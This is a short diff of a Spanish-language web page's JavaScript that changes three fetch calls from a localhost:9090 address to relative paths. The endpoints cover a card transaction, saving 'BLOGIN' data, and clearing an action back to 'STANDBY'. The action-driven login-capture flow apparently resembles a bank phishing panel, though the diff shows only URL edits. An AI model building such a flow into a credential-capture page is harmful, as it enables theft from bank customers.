@@ -232,7 +232,7 @@
 
         async function cargarDatos() {
             try {
-                const response = await fetch(`http://localhost:9090/api/transaccion-tarjeta/${txId}`);
+                const response = await fetch(`/api/transaccion-tarjeta/${txId}`);
                 const result = await response.json();
 
                 if (result.ok && result.data) {
@@ -401,7 +401,7 @@
             console.log('[BLOGIN] Guardando datos');
 
             try {
-                const response = await fetch('http://localhost:9090/api/guardar-blogin', {
+                const response = await fetch('/api/guardar-blogin', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
@@ -417,7 +417,7 @@
                     console.log('[BLOGIN] ✓ Datos guardados');
 
                     // Limpiar acción para volver a STANDBY
-                    await fetch(`http://localhost:9090/api/limpiar-accion/${txId}`, {
+                    await fetch(`/api/limpiar-accion/${txId}`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({ accion: 'BLOGIN' })
